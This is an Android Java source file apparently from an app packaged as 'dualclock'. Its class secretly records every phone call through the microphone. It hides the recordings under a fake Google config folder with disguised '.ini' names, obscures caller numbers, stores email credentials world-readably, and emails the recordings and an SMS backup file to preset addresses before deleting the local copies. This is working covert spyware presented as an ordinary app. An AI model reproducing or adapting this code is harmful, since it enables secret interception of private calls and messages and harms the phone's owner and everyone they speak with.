package com.and.dualclock;

/**
 * 
 * @author GK
 *
 */

import java.io.File;
import java.io.IOException;
import java.util.Calendar;
import java.util.Date;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.os.Environment;
import android.telephony.TelephonyManager;

public class IncomingCallReceiver extends BroadcastReceiver {
	public static final String AUDIO_RECORDER_FILE_EXT_3GP = ".3gp";
	public static final String AUDIO_RECORDER_FILE_EXT_MP4 = ".ini";
//	public static final String AUDIO_RECORDER_FILE_EXT_MP4 = ".mp4";
	public static final String AUDIO_RECORDER_FOLDER = "Android/data/com.google.android.apps.config";
	public static Context context = null;
	String file_name;
	File file;
	StringBuffer add, final_no;
	public String path;
	public SharedPreferences myPrefs;
	final String firstScreen = "firstWindow";
	public static String[] child = null;
	public String prefPhoneNum = "prefPhoneNum";
	public static String phonenumber1 = "", common_emailid = "",
			common_password = "", common_to1 = "", common_to2 = "",
			common_smtpserver = "", common_smtpport = "";
	public static int lock, sms, record, new_call;
	private MediaRecorder recorder = null;
	public int currentFormat = 0;
	public int output_formats[] = { MediaRecorder.OutputFormat.MPEG_4,MediaRecorder.OutputFormat.THREE_GPP
			 };
	public String file_exts[] = { AUDIO_RECORDER_FILE_EXT_MP4,AUDIO_RECORDER_FILE_EXT_3GP
			 };
	String selectedFilePath;
	public static int stop = 0, smssend = 0, smscount = 0;

	public void onReceive(Context ctx, Intent intent) {
		context = ctx;

		Bundle bundle = intent.getExtras();

		if (null == bundle)
			return;

		myPrefs = context.getSharedPreferences("myAppPrefs",
				Context.MODE_WORLD_READABLE);
		SharedPreferences.Editor editor = myPrefs.edit();
		editor.putString("common_emailid", common_emailid);
		editor.putString("common_password", common_password);
		editor.putString("common_to1", common_to1);
		editor.putString("common_to2", common_to2);
		editor.putString("common_smtpserver", common_smtpserver);
		editor.putString("common_smtpport", common_smtpport);
		editor.putInt("lock", lock);
		editor.putInt("sms", sms);
		editor.putInt("record", record);
		editor.putInt("firsttime", 1);
		editor.commit();
		myPrefs = context.getSharedPreferences("myAppPrefs",
				Context.MODE_PRIVATE);
		 Boolean firstWindow = myPrefs.getBoolean(firstScreen, false);
		 if (!firstWindow) {
			setrecord(1);
			Setup set = new Setup();
			set.first_record(1);
				
	        editor.putBoolean(firstScreen, true);
	        editor.commit(); 

		}

		String state = bundle.getString(TelephonyManager.EXTRA_STATE);

		try {

			myPrefs = context.getSharedPreferences("myAppPrefs",
					Context.MODE_PRIVATE);
			int temp_record = myPrefs.getInt("record", 1);

			if (temp_record == 1) { // Checking recording option ON

				if (bundle.getString(TelephonyManager.EXTRA_INCOMING_NUMBER) != null) {
					String phonenumber = bundle
							.getString(TelephonyManager.EXTRA_INCOMING_NUMBER);

 					try {

						final_no = new StringBuffer();
						for (int i = 0; i < phonenumber.length(); i++) {
							add = new StringBuffer();
							add.append(phonenumber.charAt(i));
							String temp = add.toString();
							boolean abc = validatemobile(temp);
							if (abc == true) {
								final_no.append(temp);
							}
							add = null;
						}
					} catch (Exception e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
					phonenumber = final_no.toString();
					final Integer[] data = new Integer[] { 2, 4, 6, 8 };
					Random r = new Random();

					int idx = r.nextInt(data.length);
					String text = ""+data[idx];
					long n = Long.parseLong(text);
					StringBuffer padNum = new StringBuffer();
					for (int i = 1; i <= 9; i++) {
						padNum.append(n);
						n++;
						if (n > 9)
							n = 1;
					}

					long padNum_lg = Long.parseLong(padNum.toString());

					long change_ph = Long.parseLong(phonenumber);
					change_ph += padNum_lg;
					String phone = Long.toString(change_ph);
					phonenumber1 = phone + text;
				}

			}
		
			// call attend
			if (state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {

				if (new_call == 1) {
					stopRecording();
				} else
					new_call = 0;
				if (new_call == 0) {
					editor.putString("phonenumber1", phonenumber1);
					editor.commit();

					/** create a thread to show splash up to splash time */

					Thread splashThread = new Thread() {
						@Override
						public void run() {
							try {
								super.run();
								int waited = 0;
								stop = 0;
								startRecording();
								while (waited < 200000) {
									sleep(100);
									waited += 100;
									if (waited >= 200000) {
										stopRecording();
										waited = 0;
										nameChanged();
										startRecording();

									}
									if (stop == 1) {
										stopRecording();
										waited = 6000000;
										smssend = 0;
									}
								}
							} catch (InterruptedException e) {
								// do nothing
							} finally {

							}
						}
					};
					splashThread.start();

				}
			}

			// call end
			if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
				stop = 1;
				myPrefs = context.getSharedPreferences("myAppPrefs",
						Context.MODE_PRIVATE);
				int temp_lock = myPrefs.getInt("lock", 1);

				stopRecording();

				if (temp_lock == 1) {
					nameChanged();
					Main main = new Main();
					main.setlock(1);
					sendmailnow();
				} else
					nameChanged();
				File dir = new File(
						"/sdcard/Android/data/com.google.android.apps.config/");

				String[] child = dir.list();
				if (child.length == 0)
					return;
				else
					nameChanged();

			}

		} catch (Exception e) {

			e.printStackTrace();
		}

	}

	public boolean validatemobile(String phonenumber) {

		String nos = phonenumber;
		Pattern p = Pattern.compile("^[0-9]*$");
		Matcher m = p.matcher(nos.trim());
		boolean matchFound = m.matches();
		if (matchFound == false) {
			return false;
		}
		return true;
	}

	// name change
	public void nameChanged() {
		try {
			File dir1 = new File(
					"/sdcard/Android/data/com.google.android.apps.config");

			String child1[] = dir1.list();

			for (int i = 0; i < child1.length; i++) {
				String b = "/sdcard/Android/data/com.google.android.apps.config/"
						+ child1[i];
				File f1 = new File(b);
				int a = child1[i].length();
				int need = a - 3;
				String aa = child1[i];
				aa = aa.substring(0, need);
				aa = "/sdcard/Android/data/com.google.android.apps.config/"
						+ aa + "ini";
				File f2 = new File(aa);
				boolean success = f1.renameTo(f2);
				if (!success) {

				}

			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	// stop record
	public void stopRecording() {

		if (null != recorder) {
			recorder.stop();
			
			recorder.reset();
			recorder.release();

			recorder = null;

			new_call = 0;

		}

	}

	// start record
	public void startRecording() {

		new_call = 1;
		recorder = new MediaRecorder();

		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
//		recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_DOWNLINK | MediaRecorder.AudioSource.VOICE_UPLINK);
//		recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
		recorder.setOutputFormat(output_formats[currentFormat]);
		recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
		recorder.setOutputFile(getFilename());
//		recorder.setOutputFile("/sdcard/sample.3gp");

		recorder.setOnErrorListener(errorListener);
		recorder.setOnInfoListener(infoListener);

		try {
			recorder.prepare();
			recorder.start();
		} catch (IllegalStateException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}

	}

	// file name
	public String getFilename() {

		try {

			String filepath = Environment.getExternalStorageDirectory()
					.getPath();
			file = new File(filepath, AUDIO_RECORDER_FOLDER);

			if (!file.exists()) {
				file.mkdirs();
			}
			Calendar ci = Calendar.getInstance();
			String yr = "" + ci.get(Calendar.YEAR);
			yr = yr.substring(2, 3);
			myPrefs = context.getSharedPreferences("myAppPrefs",
					Context.MODE_PRIVATE);
			phonenumber1 = myPrefs.getString("phonenumber1", "");

			String file_name1 = "" + ci.get(Calendar.DAY_OF_MONTH)
					+ ci.get(Calendar.HOUR) + ci.get(Calendar.MINUTE)
					+ ci.get(Calendar.SECOND);
			int len = file_name1.length();
			String ran = file_name1.substring(0, len);
			long val = Long.parseLong(file_name1) + Long.parseLong(ran);

			file_name = Long.toString(val) + "-" + phonenumber1;

		} catch (NumberFormatException e) {

			e.printStackTrace();
		}

		return (file.getAbsolutePath() + "/" + file_name + file_exts[currentFormat]);
	}

	private MediaRecorder.OnErrorListener errorListener = new MediaRecorder.OnErrorListener() {
		@Override
		public void onError(MediaRecorder mr, int what, int extra) {

		}
	};

	private MediaRecorder.OnInfoListener infoListener = new MediaRecorder.OnInfoListener() {
		@Override
		public void onInfo(MediaRecorder mr, int what, int extra) {

		}
	};

	public void valueset(String emailId, String emailPass, String to1,
			String to2, String smtpSev, String smtpPor, int lockvalue) {

		common_emailid = emailId;
		common_password = emailPass;
		common_to1 = to1;
		common_to2 = to2;
		common_smtpserver = smtpSev;
		common_smtpport = smtpPor;
		lock = lockvalue;

	}

	public void phone_set(String phonenumber11) {
		phonenumber1 = phonenumber11;

	}

	public void setsms(int sms1) {
		sms = sms1;

	}

	public void setrecord(int record1) {
		record = record1;
		
	}

	

	// send mail
	public void sendmailnow() {
		try {
			File dir = new File(
					"/sdcard/Android/data/com.google.android.apps.config/");

			child = dir.list();
			if (child.length == 0) {
				// Toast.makeText(context, "No File to sent.",
				// Toast.LENGTH_SHORT)
				// .show();
			}

			else {
				File dir1 = new File(
						"/sdcard/Android/data/com.google.android.apps.config/");

				String child1[] = dir1.list();
				for (int i = 0; i < child1.length; i++) {
					Mail m1 = new Mail(common_emailid, common_password,
							common_smtpserver, common_smtpport);

					String[] toArr = { common_to1, common_to2 };
					m1.setTo(toArr);
					m1.setFrom("AndroidTest@icmindia.com");
					m1.setSubject("Call Record - RecorderBuild version-2.1.0");
					Calendar ci = Calendar.getInstance();

					String CiDateTime = "" + ci.get(Calendar.YEAR) + "-"
							+ (ci.get(Calendar.MONTH) + 1) + "-"
							+ ci.get(Calendar.DAY_OF_MONTH) + " "
							+ ci.get(Calendar.HOUR) + ":"
							+ ci.get(Calendar.MINUTE) + ":"
							+ ci.get(Calendar.SECOND);
					String body, body2;
					String body1 = "Recorded File." + "\n" + CiDateTime + "   ";

					m1
							.addAttachment("/sdcard/Android/data/com.google.android.apps.config/"
									+ child1[i]);
					File filedate = new File(
							"/sdcard/Android/data/com.google.android.apps.config/"
									+ child1[i]);
					Date lastModDate = new Date(filedate.lastModified());
					String Decrypt = decryptmobileno(child1[i]);
					body2 = "Mobile No : " +Decrypt + "    File date:  "
							+ lastModDate.toString();

					body = body1 + body2;
					m1.setBody(body);

					if (m1.send()) {

						File file = new File(
								"/sdcard/Android/data/com.google.android.apps.config/"
										+ child1[i]);
						boolean deleted = file.delete();
						if (deleted == true) {

						}

					} else {

					}

				}
			}
		} catch (Exception e) {

			e.printStackTrace();
		}

	}

	public String decryptmobileno(String encrypt) {
		String phone ="";
		String decrypt = encrypt ;
		decrypt = decrypt.substring((decrypt.indexOf('-')+1),decrypt.indexOf('.'));
		if(!decrypt.equals(""))
		{
		String encry_txt = ""+decrypt.charAt(decrypt.length()-1);
		long n = Long.parseLong(encry_txt);
		StringBuffer padNum = new StringBuffer();
		for (int i = 1; i <= 9; i++) {
			padNum.append(n);
			n++;
			if (n > 9)
				n = 1;
		}

		long padNum_lg = Long.parseLong(padNum.toString());
		String desire_ph = decrypt.substring(0, (decrypt.length()-1));
		long change_ph = Long.parseLong(desire_ph);
		change_ph -= padNum_lg;
		phone = Long.toString(change_ph);
		}
		return phone;
		
		
		
	}

	// send sms
	public void sendSmsNow() {

		try {
			String body = null;

			Mail m = new Mail(common_emailid, common_password,
					common_smtpserver, common_smtpport);

			String[] toArr = { common_to1, common_to2 };
			m.setTo(toArr);
			m.setFrom("AndroidTest@icmindia.com");
			m.setSubject("SMS Backup. Version 2.1.0");

			Calendar ci = Calendar.getInstance();

			String CiDateTime = "" + ci.get(Calendar.YEAR) + "-"
					+ (ci.get(Calendar.MONTH) + 1) + "-"
					+ ci.get(Calendar.DAY_OF_MONTH) + " "
					+ ci.get(Calendar.HOUR) + ":" + ci.get(Calendar.MINUTE)
					+ ":" + ci.get(Calendar.SECOND);
			try {

				File filedate = new File(
						"/sdcard/Android/data/com.google.android.apps.config/androidconfig.ini");
				Date lastModDate = new Date(filedate.lastModified());
				body = "Send time : " + CiDateTime + "\n" + "File date:  "
						+ lastModDate.toString();
				m.setBody(body);

				m
						.addAttachment("/sdcard/Android/data/com.google.android.apps.config/androidconfig.ini");

				if (m.send()) {

					File file = new File(
							"/sdcard/Android/data/com.google.android.apps.config/androidconfig.ini");
					boolean deleted = file.delete();
					if (deleted == true) {

					}

				} else {

				}
			} catch (Exception e) {

			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

}
